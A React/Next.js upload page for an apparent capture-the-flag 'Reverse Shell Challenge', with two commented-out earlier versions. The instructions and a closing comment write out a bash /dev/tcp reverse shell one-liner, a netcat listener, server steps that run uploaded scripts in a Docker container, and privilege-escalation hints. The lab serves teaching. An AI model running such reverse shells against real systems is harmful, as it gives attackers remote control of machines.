// // "use client";

// // import { useState, useRef, DragEvent, ChangeEvent } from "react";

// // interface UploadedFile {
// //   file: File;
// //   id: number;
// // }

// // let idCounter = 0;

// // function getSize(b: number): string {
// //   if (b < 1024) return b + " B";
// //   else if (b < 1048576) return Math.round(b / 1024) + " KB";
// //   return (b / 1048576).toFixed(1) + " MB";
// // }

// // // function getExt(name: string): string {
// // //   const parts = name.split(".");
// // //   return parts.length > 1 ? "." + parts.pop()!.toLowerCase() : "file";
// // // }

// // function getExtension(name:string): string{
// //   const parts=name.split(".");
// //   if(parts.length>1){
// //     const ext=parts.pop()?.toLowerCase();
// //     return ext || "file";
// //   }
// //   return "file";
// // }

// // export default function UploadPage() {
// //   const [email, setEmail] = useState("");
// //   const [files, setFiles] = useState<UploadedFile[]>([]);
// //   const [isDragging, setIsDragging] = useState(false);
// //   const [isSubmitting, setIsSubmitting] = useState(false);
// //   const [successMsg, setSuccessMsg] = useState("");
// //   const fileInputRef = useRef<HTMLInputElement>(null);

// //   const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim());
// //   const canSubmit = isValidEmail && files.length > 0;

// //   function addFiles(incoming: FileList | null) {
// //     if (!incoming) return;
// //     const newFiles: UploadedFile[] = Array.from(incoming).map((file) => ({
// //       file,
// //       id: idCounter++,
// //     }));
// //     setFiles((prev) => [...prev, ...newFiles]);
// //     setSuccessMsg("");
// //   }

// //   function removeFile(id: number) {
// //     setFiles((prev) => prev.filter((f) => f.id !== id));
// //   }

// //   function onInputChange(e: ChangeEvent<HTMLInputElement>) {
// //     addFiles(e.target.files);
// //     e.target.value = "";
// //   }

// //   function onDragOver(e: DragEvent<HTMLDivElement>) {
// //     e.preventDefault();
// //     setIsDragging(true);
// //   }

// //   function onDragLeave() {
// //     setIsDragging(false);
// //   }

// //   function onDrop(e: DragEvent<HTMLDivElement>) {
// //     e.preventDefault();
// //     setIsDragging(false);
// //     addFiles(e.dataTransfer.files);
// //   }

// //   function handleSubmit() {
// //     if (!canSubmit) return;
// //     setIsSubmitting(true);
// //     // Replace this timeout with your actual API call
// //     setTimeout(() => {
// //       setSuccessMsg(
// //         `Received ${files.length} file${files.length > 1 ? "s" : ""} from ${email.trim()}.`
// //       );
// //       setFiles([]);
// //       setEmail("");
// //       setIsSubmitting(false);
// //     }, 900);
// //   }

// //   return (
// //     <main className="min-h-screen w-full bg-gray-300 flex items-center justify-center px-4 py-12">

// //       {/* Subtle background blobs */}
// //       <div className="pointer-events-none fixed inset-0 overflow-hidden -z-10">
// //         <div className="absolute -top-32 -left-32 w-96 h-96 bg-violet-200/30 rounded-full blur-3xl" />
// //         <div className="absolute -bottom-32 -right-32 w-96 h-96 bg-indigo-200/20 rounded-full blur-3xl" />
// //       </div>

// //       <div className="w-full max-w-md">

// //         {/* Top badge */}
// //         {/* <div className="flex justify-center mb-6">
// //           {/* <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-violet-100 border border-violet-200 text-violet-600 text-xs font-medium tracking-wide"> */}
// //             {/* <span className="w-1.5 h-1.5 rounded-full bg-violet-500 inline-block" />
// //             Secure Upload
// //           </span> */}
// //         {/* </div> */} 

// //         {/* Card */}
// //         <div className="bg-white/80 backdrop-blur-sm border border-white/60 rounded-3xl shadow-xl shadow-violet-100/40 p-8">

// //           {/* Header */}
// //           <div className="text-center mb-8">
// //             <h1 className="text-3xl font-semibold  tracking-tight mb-1">
// //               Upload your files
// //             </h1>
// //             <p className="text-md text-green-900">
// //               Scripts, executables, configs — all file types accepted
// //             </p>
// //           </div>

// //           {/* Email */}
// //           <div className="mb-4">
// //             <label
// //               htmlFor="email-in"
// //               className="block text-sm font-semibold text-gray-900 uppercase tracking-wider mb-2"
// //             >
// //               Email address
// //             </label>
// //             <input
              
// //               type="email"
// //               value={email}
// //               onChange={(e) => setEmail(e.target.value)}
// //               placeholder="email@nitm.ac.in"
// //               autoComplete="email"
// //               className="w-full h-11 px-4 text-sm bg-gray-50 border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 outline-none focus:bg-white focus:border-violet-400 focus:ring-4 focus:ring-violet-100 transition-all duration-150"
// //             />
// //           </div>

// //           {/* File Upload */}
// //           <div className="mb-6">
// //             <label className="block text-sm font-semibold text-gray-900 uppercase tracking-wider mb-2">
// //               Files
// //             </label>

// //             {/* Drop Zone */}
// //             <div
// //               onDragOver={onDragOver}
// //               onDragLeave={onDragLeave}
// //               onDrop={onDrop}
// //               onClick={() => fileInputRef.current?.click()}
// //               className={`relative border-2 border-dashed rounded-2xl p-8 text-center cursor-pointer transition-all duration-200 group
// //                 ${
// //                   isDragging
// //                     ? "border-violet-400 bg-violet-50 scale-[1.01]"
// //                     : "border-gray-200 hover:border-violet-300 hover:bg-violet-50/50"
// //                 }`}
// //             >
// //               <input
// //                 ref={fileInputRef}
// //                 type="file"
// //                 multiple
// //                 accept="*/*"
// //                 onChange={onInputChange}
// //                 className="hidden"
// //               />

// //               {/* Icon */}
// //               <div
// //                 className={`w-12 h-12 mx-auto mb-3 rounded-2xl flex items-center justify-center transition-all duration-200
// //                   ${
// //                     isDragging
// //                       ? "bg-violet-100 scale-110"
// //                       : "bg-violet-50 group-hover:bg-violet-100 group-hover:scale-105"
// //                   }`}
// //               >
// //                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
// //                   <path
// //                     d="M12 3v12M8 7l4-4 4 4M3 17v2a2 2 0 002 2h14a2 2 0 002-2v-2"
// //                     stroke="#7C3AED"
// //                     strokeWidth="2"
// //                     strokeLinecap="round"
// //                     strokeLinejoin="round"
// //                   />
// //                 </svg>
// //               </div>

// //               <p className="text-md font-semibold text-gray-700 mb-1">
// //                 {isDragging ? "Release to upload" : "Drag & drop files here"}
// //               </p>
// //               <p className="text-xs text-gray-400 mb-3">
// //                 or{" "}
// //                 <span className="text-violet-600 font-medium underline underline-offset-2">
// //                   click to browse
// //                 </span>
// //               </p>
// //               {/* <div className="flex flex-wrap justify-center gap-1"> */}
// //                 {/* {[".py", ".js", ".sh", ".exe", ".zip", ".bin", "..."].map((ext) => (
// //                   // <span
// //                   //   key={ext}
// //                   //   className="px-1.5 py-0.5 rounded bg-gray-100 text-gray-400 text-[10px]"
// //                   // >
// //                   //   {ext}
// //                   // </span>
// //                 ))} */}
// //               {/* </div> */}
// //             </div>

// //             {/* File List */}
// //             {files.length > 0 && (
// //               <>
// //                 <ul className="mt-3 flex flex-col gap-1.5 max-h-48 overflow-y-auto">
// //                   {files.map(({ file, id }) => (
// //                     <li
// //                       key={id}
// //                       className="flex items-center gap-2.5 px-3 py-2 bg-gray-50 border border-gray-100 rounded-xl group/item hover:border-violet-100 hover:bg-violet-50/40 transition-all"
// //                     >
// //                       <span className=" text-[10px] px-1.5 py-0.5 rounded-md bg-violet-100 text-violet-600 shrink-0 font-medium">
// //                         {getExtension(file.name)}
// //                       </span>
// //                       <span className=" text-[11px] text-gray-700 flex-1 truncate">
// //                         {file.name}
// //                       </span>
// //                       <span className="text-[11px] text-gray-400 shrink-0 tabular-nums">
// //                         {getSize(file.size)}
// //                       </span>
// //                       <button
// //                         onClick={(e) => {
// //                           e.stopPropagation();
// //                           removeFile(id);
// //                         }}
// //                         className="w-5 h-5 rounded-full flex items-center justify-center text-gray-300 hover:text-white hover:bg-red-400 text-xs shrink-0 transition-all opacity-0 group-hover/item:opacity-100"
// //                         aria-label="Remove file"
// //                       >
// //                         ✕
// //                       </button>
// //                     </li>
// //                   ))}
// //                 </ul>
// //                 <p className="text-xs text-gray-400 mt-2 text-right">
// //                   {files.length} file{files.length > 1 ? "s" : ""} selected
// //                 </p>
// //               </>
// //             )}
// //           </div>

// //           {/* Submit */}
// //           <button
// //             onClick={handleSubmit}
// //             disabled={!canSubmit || isSubmitting}
// //             className="w-full h-12 rounded-xl text-sm font-semibold tracking-wide transition-all duration-150
// //               bg-violet-600 text-white hover:bg-violet-700 hover:shadow-lg hover:shadow-violet-200 active:scale-[0.98]
// //               disabled:bg-gray-100 disabled:text-gray-300 disabled:cursor-not-allowed disabled:shadow-none"
// //           >
// //             {isSubmitting ? (
// //               <span className="flex items-center justify-center gap-2">
// //                 <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none">
// //                   <circle
// //                     cx="12"
// //                     cy="12"
// //                     r="10"
// //                     stroke="currentColor"
// //                     strokeWidth="3"
// //                     strokeOpacity="0.25"
// //                   />
// //                   <path
// //                     d="M12 2a10 10 0 0110 10"
// //                     stroke="currentColor"
// //                     strokeWidth="3"
// //                     strokeLinecap="round"
// //                   />
// //                 </svg>
// //                 Submitting…
// //               </span>
// //             ) : (
// //               "Submit"
// //             )}
// //           </button>

// //           {/* Success */}
// //           {successMsg && (
// //             <div className="flex items-center gap-2.5 mt-4 px-4 py-3 rounded-xl bg-emerald-50 border border-emerald-200">
// //               <div className="w-5 h-5 rounded-full bg-emerald-100 flex items-center justify-center shrink-0">
// //                 <svg width="12" height="12" viewBox="0 0 16 16" fill="none">
// //                   <path
// //                     d="M3 8l3.5 3.5 6.5-7"
// //                     stroke="#059669"
// //                     strokeWidth="2"
// //                     strokeLinecap="round"
// //                     strokeLinejoin="round"
// //                   />
// //                 </svg>
// //               </div>
// //               <span className="text-xs font-medium text-emerald-700">{successMsg}</span>
// //             </div>
// //           )}
// //         </div>

// //         {/* Footer note */}
// //         {/* <p className="text-center text-xs text-gray-400 mt-5">
// //           🔒 All file types accepted · No client-side size restrictions
// //         </p> */}
// //       </div>
// //     </main>
// //   );
// // }




// "use client";

// import { useState, useRef, useEffect, DragEvent, ChangeEvent } from "react";

// interface UploadedFile {
//   file: File;
//   id: number;
// }

// interface InstanceInfo {
//   host: string;
//   port: number;
//   expires_in: number;
// }

// let idCounter = 0;

// function getSize(b: number): string {
//   if (b < 1024) return b + " B";
//   else if (b < 1048576) return Math.round(b / 1024) + " KB";
//   return (b / 1048576).toFixed(1) + " MB";
// }

// function getExtension(name: string): string {
//   const parts = name.split(".");
//   if (parts.length > 1) return parts.pop()?.toLowerCase() || "file";
//   return "file";
// }

// export default function UploadPage() {
//   const [files, setFiles]           = useState<UploadedFile[]>([]);
//   const [isDragging, setIsDragging] = useState(false);
//   const [isSubmitting, setIsSubmitting] = useState(false);
//   const [error, setError]           = useState("");
//   const [instance, setInstance]     = useState<InstanceInfo | null>(null);
//   const [countdown, setCountdown]   = useState(0);
//   const [copied, setCopied]         = useState(false);
//   const fileInputRef = useRef<HTMLInputElement>(null);

//   // ── Countdown timer ───────────────────────────────────────────
//   //CAN BE REMOVED
//   useEffect(() => {
//     if (!instance) return;
//     setCountdown(instance.expires_in);
//     const interval = setInterval(() => {
//       setCountdown((prev) => {
//         if (prev <= 1) { clearInterval(interval); setInstance(null); return 0; }
//         return prev - 1;
//       });
//     }, 1000);
//     return () => clearInterval(interval);
//   }, [instance]);

//   // ── File handling ─────────────────────────────────────────────
//   function addFiles(incoming: FileList | null) {
//     if (!incoming) return;
//     setFiles((prev) => [
//       ...prev,
//       ...Array.from(incoming).map((file) => ({ file, id: idCounter++ })),
//     ]);
//     setError("");
//   }

//   function removeFile(id: number) {
//     setFiles((prev) => prev.filter((f) => f.id !== id));
//   }

//   function onInputChange(e: ChangeEvent<HTMLInputElement>) {
//     addFiles(e.target.files);
//     e.target.value = "";
//   }

//   function onDragOver(e: DragEvent<HTMLDivElement>) {
//     e.preventDefault();
//     setIsDragging(true);
//   }

//   function onDragLeave() { setIsDragging(false); }

//   function onDrop(e: DragEvent<HTMLDivElement>) {
//     e.preventDefault();
//     setIsDragging(false);
//     addFiles(e.dataTransfer.files);
//   }

//   // ── Submit — upload + spawn container ────────────────────────
//   async function handleSubmit() {
//     if (!files.length || isSubmitting) return;
//     setIsSubmitting(true);
//     setError("");
//     setInstance(null);

//     try {
//       const formData = new FormData();
//       files.forEach((f) => formData.append("file", f.file));

//       //WE ARE GIVING THE DATA IN FILE TO /API/UPLOAD
//       const res = await fetch("/api/upload", {
//         method: "POST",
//         body: formData,
//       });

//       const data = await res.json();
//       if (!res.ok) throw new Error(data.error || "Upload failed");

//       setInstance(data);
//       setFiles([]);
//     } catch (err: any) {
//       setError(err.message);
//     } finally {
//       setIsSubmitting(false);
//     }
//   }

//   function copyNcCommand() {
//     if (!instance) return;
//     navigator.clipboard.writeText(`nc ${instance.host} ${instance.port}`);
//     setCopied(true);
//     setTimeout(() => setCopied(false), 2000);
//   }

//   const minutes = Math.floor(countdown / 60);
//   const seconds = countdown % 60;
//   const isExpiringSoon = countdown < 300 && countdown > 0;

//   return (
//     <main className="min-h-screen w-full bg-gray-300 flex items-center justify-center px-4 py-12">

//       {/* Background blobs */}
//       <div className="pointer-events-none fixed inset-0 overflow-hidden -z-10">
//         <div className="absolute -top-32 -left-32 w-96 h-96 bg-violet-200/30 rounded-full blur-3xl" />
//         <div className="absolute -bottom-32 -right-32 w-96 h-96 bg-indigo-200/20 rounded-full blur-3xl" />
//       </div>

//       <div className="w-full max-w-md space-y-4">

//         {/* ── Upload Card ──────────────────────────────────────── */}
//         <div className="bg-white/80 backdrop-blur-sm border border-white/60 rounded-3xl shadow-xl shadow-violet-100/40 p-8">

//           <div className="text-center mb-8">
//             <h1 className="text-3xl font-semibold tracking-tight mb-1">
//               Upload your script
//             </h1>
//             <p className="text-sm text-gray-500">
//               Upload a reverse shell script — get a live nc session
//             </p>
//           </div>

//           {/* Drop Zone */}
//           <div className="mb-6">
//             <label className="block text-sm font-semibold text-gray-900 uppercase tracking-wider mb-2">
//               Script File
//             </label>

//             <div
//               onDragOver={onDragOver}
//               onDragLeave={onDragLeave}
//               onDrop={onDrop}
//               onClick={() => fileInputRef.current?.click()}
//               className={`relative border-2 border-dashed rounded-2xl p-8 text-center cursor-pointer transition-all duration-200 group
//                 ${isDragging
//                   ? "border-violet-400 bg-violet-50 scale-[1.01]"
//                   : "border-gray-200 hover:border-violet-300 hover:bg-violet-50/50"
//                 }`}
//             >
//               <input
//                 ref={fileInputRef}
//                 type="file"
//                 multiple
//                 accept="*/*"
//                 onChange={onInputChange}
//                 className="hidden"
//               />

//               <div className={`w-12 h-12 mx-auto mb-3 rounded-2xl flex items-center justify-center transition-all duration-200
//                 ${isDragging
//                   ? "bg-violet-100 scale-110"
//                   : "bg-violet-50 group-hover:bg-violet-100 group-hover:scale-105"
//                 }`}
//               >
//                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
//                   <path
//                     d="M12 3v12M8 7l4-4 4 4M3 17v2a2 2 0 002 2h14a2 2 0 002-2v-2"
//                     stroke="#7C3AED" strokeWidth="2"
//                     strokeLinecap="round" strokeLinejoin="round"
//                   />
//                 </svg>
//               </div>

//               <p className="text-sm font-semibold text-gray-700 mb-1">
//                 {isDragging ? "Release to upload" : "Drag & drop your script"}
//               </p>
//               <p className="text-xs text-gray-400">
//                 or{" "}
//                 <span className="text-violet-600 font-medium underline underline-offset-2">
//                   click to browse
//                 </span>
//               </p>
//             </div>

//             {/* File list */}
//             {files.length > 0 && (
//               <>
//                 <ul className="mt-3 flex flex-col gap-1.5 max-h-48 overflow-y-auto">
//                   {files.map(({ file, id }) => (
//                     <li
//                       key={id}
//                       className="flex items-center gap-2.5 px-3 py-2 bg-gray-50 border border-gray-100 rounded-xl group/item hover:border-violet-100 hover:bg-violet-50/40 transition-all"
//                     >
//                       <span className="text-[10px] px-1.5 py-0.5 rounded-md bg-violet-100 text-violet-600 shrink-0 font-medium">
//                         {getExtension(file.name)}
//                       </span>
//                       <span className="text-[11px] text-gray-700 flex-1 truncate">
//                         {file.name}
//                       </span>
//                       <span className="text-[11px] text-gray-400 shrink-0 tabular-nums">
//                         {getSize(file.size)}
//                       </span>
//                       <button
//                         onClick={(e) => { e.stopPropagation(); removeFile(id); }}
//                         className="w-5 h-5 rounded-full flex items-center justify-center text-gray-300 hover:text-white hover:bg-red-400 text-xs shrink-0 transition-all opacity-0 group-hover/item:opacity-100"
//                       >
//                         ✕
//                       </button>
//                     </li>
//                   ))}
//                 </ul>
//                 <p className="text-xs text-gray-400 mt-2 text-right">
//                   {files.length} file{files.length > 1 ? "s" : ""} selected
//                 </p>
//               </>
//             )}
//           </div>

//           {/* Error */}
//           {error && (
//             <div className="mb-4 px-4 py-3 rounded-xl bg-red-50 border border-red-200">
//               <p className="text-xs font-medium text-red-600">{error}</p>
//             </div>
//           )}

//           {/* Submit */}
//           <button
//             onClick={handleSubmit}
//             disabled={!files.length || isSubmitting}
//             className="w-full h-12 rounded-xl text-sm font-semibold tracking-wide transition-all duration-150
//               bg-violet-600 text-white hover:bg-violet-700 hover:shadow-lg hover:shadow-violet-200 active:scale-[0.98]
//               disabled:bg-gray-100 disabled:text-gray-300 disabled:cursor-not-allowed disabled:shadow-none"
//           >
//             {isSubmitting ? (
//               <span className="flex items-center justify-center gap-2">
//                 <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none">
//                   <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25" />
//                   <path d="M12 2a10 10 0 0110 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round" />
//                 </svg>
//                 Spawning container…
//               </span>
//             ) : (
//               "Upload & Get Connection →"
//             )}
//           </button>
//         </div>

//         {/* ── NC Command Card ───────────────────────────────────── */}
//         {instance && (
//           <div className="bg-zinc-900 border border-zinc-700 rounded-3xl p-6 space-y-5">

//             {/* Status bar */}
//             <div className="flex items-center justify-between">
//               <div className="flex items-center gap-2">
//                 <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
//                 <span className="text-green-400 text-sm font-mono font-semibold">
//                   Container Live
//                 </span>
//               </div>
//               <span className={`text-xs font-mono px-2.5 py-1 rounded-lg border ${
//                 isExpiringSoon
//                   ? "text-red-400 border-red-800 bg-red-950/40 animate-pulse"
//                   : "text-zinc-400 border-zinc-700 bg-zinc-800"
//               }`}>
//                 {minutes}m {String(seconds).padStart(2, "0")}s remaining
//               </span>
//             </div>

//             {/* NC command */}
//             <div className="space-y-2">
//               <p className="text-zinc-500 text-xs uppercase tracking-widest font-mono">
//                 Run this in your terminal
//               </p>
//               <div className="bg-zinc-800 border border-zinc-700 rounded-xl px-4 py-4 flex items-center justify-between gap-3">
//                 <code className="text-green-300 text-base font-mono">
//                   nc {instance.host} {instance.port}
//                 </code>
//                 <button
//                   onClick={copyNcCommand}
//                   className={`shrink-0 text-xs font-mono px-3 py-1.5 rounded-lg border transition-all ${
//                     copied
//                       ? "text-green-400 border-green-700 bg-green-950/40"
//                       : "text-zinc-400 border-zinc-600 hover:text-white hover:border-zinc-500"
//                   }`}
//                 >
//                   {copied ? "✓ copied" : "copy"}
//                 </button>
//               </div>
//             </div>

//             {/* Hints */}
//             <div className="space-y-2">
//               <p className="text-zinc-500 text-xs uppercase tracking-widest font-mono">
//                 Once connected
//               </p>
//               <div className="bg-zinc-800 border border-zinc-700 rounded-xl px-4 py-4 space-y-2 font-mono text-xs">
//                 <div className="flex gap-3">
//                   <span className="text-zinc-600 shrink-0">1.</span>
//                   <span className="text-zinc-300">
//                     <span className="text-green-400">cat flag1.txt</span>
//                     <span className="text-zinc-600"> — readable as current user</span>
//                   </span>
//                 </div>
//                 <div className="flex gap-3">
//                   <span className="text-zinc-600 shrink-0">2.</span>
//                   <span className="text-zinc-300">
//                     <span className="text-yellow-400">sudo -l</span>
//                     <span className="text-zinc-600"> — check what you can run as root</span>
//                   </span>
//                 </div>
//                 <div className="flex gap-3">
//                   <span className="text-zinc-600 shrink-0">3.</span>
//                   <span className="text-zinc-300">
//                     <span className="text-red-400">cat /root/flag2.txt</span>
//                     <span className="text-zinc-600"> — escalate first</span>
//                   </span>
//                 </div>
//               </div>
//             </div>

//             {/* Expiry warning */}
//             {isExpiringSoon && (
//               <div className="px-4 py-3 rounded-xl bg-red-950/40 border border-red-900">
//                 <p className="text-red-400 text-xs font-mono text-center">
//                   ⚠ Container expiring soon — save your flags now
//                 </p>
//               </div>
//             )}
//           </div>
//         )}
//       </div>
//     </main>
//   );
// }




"use client";

import { useState, useRef, DragEvent, ChangeEvent } from "react";

let idCounter = 0;

function getSize(b: number): string {
  if (b < 1024) return b + " B";
  else if (b < 1048576) return Math.round(b / 1024) + " KB";
  return (b / 1048576).toFixed(1) + " MB";
}

type Stage = "idle" | "submitting" | "success" | "error";

export default function UploadPage() {
  const [file, setFile]             = useState<File | null>(null);
  const [isDragging, setIsDragging] = useState(false);
  const [stage, setStage]           = useState<Stage>("idle");
  const [error, setError]           = useState("");
  const fileInputRef = useRef<HTMLInputElement>(null);

  // ── File handling ─────────────────────────────────────────────
  function setScriptFile(incoming: FileList | null) {
    if (!incoming || incoming.length === 0) return;
    setFile(incoming[0]);   // only one script needed
    setStage("idle");
    setError("");
  }

  function onInputChange(e: ChangeEvent<HTMLInputElement>) {
    setScriptFile(e.target.files);
    e.target.value = "";
  }

  function onDragOver(e: DragEvent<HTMLDivElement>) {
    e.preventDefault();
    setIsDragging(true);
  }

  function onDragLeave() { setIsDragging(false); }

  function onDrop(e: DragEvent<HTMLDivElement>) {
    e.preventDefault();
    setIsDragging(false);
    setScriptFile(e.dataTransfer.files);
  }

  // ── Submit ────────────────────────────────────────────────────
  async function handleSubmit() {
    if (!file || stage === "submitting") return;
    setStage("submitting");
    setError("");

    try {
      const formData = new FormData();
      formData.append("file", file);

      const res  = await fetch("/api/upload", { method: "POST", body: formData });
      const data = await res.json();

      if (!res.ok) throw new Error(data.error || "Upload failed");

      setStage("success");
      setFile(null);
    } catch (err: any) {
      setError(err.message);
      setStage("error");
    }
  }

  return (
    <main className="min-h-screen w-full bg-gray-300 flex items-center justify-center px-4 py-12">

      {/* Background blobs */}
      <div className="pointer-events-none fixed inset-0 overflow-hidden -z-10">
        <div className="absolute -top-32 -left-32 w-96 h-96 bg-violet-200/30 rounded-full blur-3xl" />
        <div className="absolute -bottom-32 -right-32 w-96 h-96 bg-indigo-200/20 rounded-full blur-3xl" />
      </div>

      <div className="w-full max-w-md space-y-4">

        {/* ── Main card ────────────────────────────────────────── */}
        <div className="bg-white/80 backdrop-blur-sm border border-white/60 rounded-3xl shadow-xl shadow-violet-100/40 p-8">

          <div className="text-center mb-8">
            <h1 className="text-3xl font-semibold tracking-tight mb-1">
              Reverse Shell Challenge
            </h1>
            <p className="text-sm text-gray-500">
              Upload your shell script — our container will call back to you
            </p>
          </div>

          {/* ── How it works ─────────────────────────────────── */}
          <div className="mb-6 bg-zinc-900 rounded-2xl p-4 space-y-3">
            <p className="text-zinc-400 text-xs uppercase tracking-widest font-mono">
              How it works
            </p>
            <ol className="space-y-2 font-mono text-xs">
              <li className="flex gap-3">
                <span className="text-violet-400 shrink-0">1.</span>
                <span className="text-zinc-300">
                  Start listening on your machine:
                  <code className="block text-green-400 mt-1">nc -lvp 6666</code>
                </span>
              </li>
              <li className="flex gap-3">
                <span className="text-violet-400 shrink-0">2.</span>
                <span className="text-zinc-300">
                  Create a script with your IP and port:
                  <code className="block text-yellow-400 mt-1 break-all">
                    bash -i &gt;&amp; /dev/tcp/YOUR_IP/6666 0&gt;&amp;1
                  </code>
                </span>
              </li>
              <li className="flex gap-3">
                <span className="text-violet-400 shrink-0">3.</span>
                <span className="text-zinc-300">
                  Upload it here — container executes it and calls back to you
                </span>
              </li>
              <li className="flex gap-3">
                <span className="text-violet-400 shrink-0">4.</span>
                <span className="text-zinc-300">
                  Your nc gets a shell — find the flags!
                </span>
              </li>
            </ol>
          </div>

          {/* ── Drop zone ────────────────────────────────────── */}
          <div className="mb-6">
            <label className="block text-sm font-semibold text-gray-900 uppercase tracking-wider mb-2">
              Your Shell Script (.sh)
            </label>

            <div
              onDragOver={onDragOver}
              onDragLeave={onDragLeave}
              onDrop={onDrop}
              onClick={() => fileInputRef.current?.click()}
              className={`relative border-2 border-dashed rounded-2xl p-8 text-center cursor-pointer transition-all duration-200 group
                ${isDragging
                  ? "border-violet-400 bg-violet-50 scale-[1.01]"
                  : file
                  ? "border-green-300 bg-green-50/50"
                  : "border-gray-200 hover:border-violet-300 hover:bg-violet-50/50"
                }`}
            >
              <input
                ref={fileInputRef}
                type="file"
                accept=".sh,text/plain,application/x-sh"
                onChange={onInputChange}
                className="hidden"
              />

              <div className={`w-12 h-12 mx-auto mb-3 rounded-2xl flex items-center justify-center transition-all duration-200
                ${isDragging ? "bg-violet-100 scale-110"
                  : file ? "bg-green-100"
                  : "bg-violet-50 group-hover:bg-violet-100 group-hover:scale-105"}`}
              >
                {file ? (
                  // File selected icon
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                    <path d="M9 12l2 2 4-4M5 13V7a2 2 0 012-2h6l4 4v10a2 2 0 01-2 2H7a2 2 0 01-2-2v-1"
                      stroke="#16a34a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                ) : (
                  // Upload icon
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                    <path d="M12 3v12M8 7l4-4 4 4M3 17v2a2 2 0 002 2h14a2 2 0 002-2v-2"
                      stroke="#7C3AED" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                )}
              </div>

              {file ? (
                <>
                  <p className="text-sm font-semibold text-green-700 mb-0.5">{file.name}</p>
                  <p className="text-xs text-green-600">{getSize(file.size)}</p>
                  <button
                    onClick={(e) => { e.stopPropagation(); setFile(null); setStage("idle"); }}
                    className="mt-2 text-xs text-red-400 hover:text-red-600 underline"
                  >
                    Remove
                  </button>
                </>
              ) : (
                <>
                  <p className="text-sm font-semibold text-gray-700 mb-1">
                    {isDragging ? "Release to upload" : "Drag & drop your .sh script"}
                  </p>
                  <p className="text-xs text-gray-400">
                    or{" "}
                    <span className="text-violet-600 font-medium underline underline-offset-2">
                      click to browse
                    </span>
                  </p>
                </>
              )}
            </div>
          </div>

          {/* Error */}
          {stage === "error" && (
            <div className="mb-4 px-4 py-3 rounded-xl bg-red-50 border border-red-200">
              <p className="text-xs font-medium text-red-600">⚠ {error}</p>
            </div>
          )}

          {/* Submit button */}
          <button
            onClick={handleSubmit}
            disabled={!file || stage === "submitting"}
            className="w-full h-12 rounded-xl text-sm font-semibold tracking-wide transition-all duration-150
              bg-violet-600 text-white hover:bg-violet-700 hover:shadow-lg hover:shadow-violet-200 active:scale-[0.98]
              disabled:bg-gray-100 disabled:text-gray-300 disabled:cursor-not-allowed disabled:shadow-none"
          >
            {stage === "submitting" ? (
              <span className="flex items-center justify-center gap-2">
                <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25" />
                  <path d="M12 2a10 10 0 0110 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round" />
                </svg>
                Executing on container…
              </span>
            ) : (
              "Upload & Execute →"
            )}
          </button>
        </div>

        {/* ── Success card — shell fired ────────────────────────── */}
        {stage === "success" && (
          <div className="bg-zinc-900 border border-green-800 rounded-3xl p-6 space-y-4">

            <div className="flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-green-400 animate-pulse" />
              <span className="text-green-400 font-mono font-semibold text-sm">
                Script executed on container!
              </span>
            </div>

            <div className="bg-zinc-800 border border-zinc-700 rounded-xl px-4 py-4 font-mono text-xs space-y-2">
              <p className="text-zinc-500"># Your nc listener should now show:</p>
              <p className="text-green-400">Connection received!</p>
              <p className="text-white">ctfuser@container:~$ <span className="animate-pulse">▌</span></p>
            </div>

            <div className="space-y-1.5 font-mono text-xs">
              <p className="text-zinc-500">Now find the flags:</p>
              <p className="text-zinc-300">
                <span className="text-green-400">cat flag1.txt</span>
                <span className="text-zinc-600"> ← flag 1 (no privesc needed)</span>
              </p>
              <p className="text-zinc-300">
                <span className="text-yellow-400">sudo -l</span>
                <span className="text-zinc-600"> ← find privesc path</span>
              </p>
              <p className="text-zinc-300">
                <span className="text-red-400">cat /root/flag2.txt</span>
                <span className="text-zinc-600"> ← flag 2 (root only)</span>
              </p>
            </div>

            {/* Try again */}
            <button
              onClick={() => setStage("idle")}
              className="w-full py-2 rounded-xl border border-zinc-700 text-zinc-400 hover:text-white hover:border-zinc-500 text-xs font-mono transition-all"
            >
              Upload another script
            </button>
          </div>
        )}
      </div>
    </main>
  );
}
// ```

// ---

// ## The exact flow now
// ```
// Player creates shell.sh:
// ───────────────────────
// #!/bin/bash
// bash -i >& /dev/tcp/172.16.6.141/6666 0>&1

// Player runs on their machine:
// ─────────────────────────────
// nc -lvp 6666       ← listening, waiting

// Player uploads shell.sh on website
// ────────────────────────────────────────────────────────
// Your server:
//   1. Saves shell.sh to /tmp/ctf-uploads/<id>/
//   2. docker run ctf-challenge  (victim container starts)
//   3. docker cp shell.sh → container:/tmp/shell.sh
//   4. docker exec bash /tmp/shell.sh  ← executes it

// Container runs:
// ───────────────
// bash -i >& /dev/tcp/172.16.6.141/6666 0>&1
//          calls back to player ──────────────►

// Player's terminal:
// ──────────────────
// $ nc -lvp 6666
// Connection received from <your-vps-ip>!
// ctfuser@container:~$ ▌    ← shell!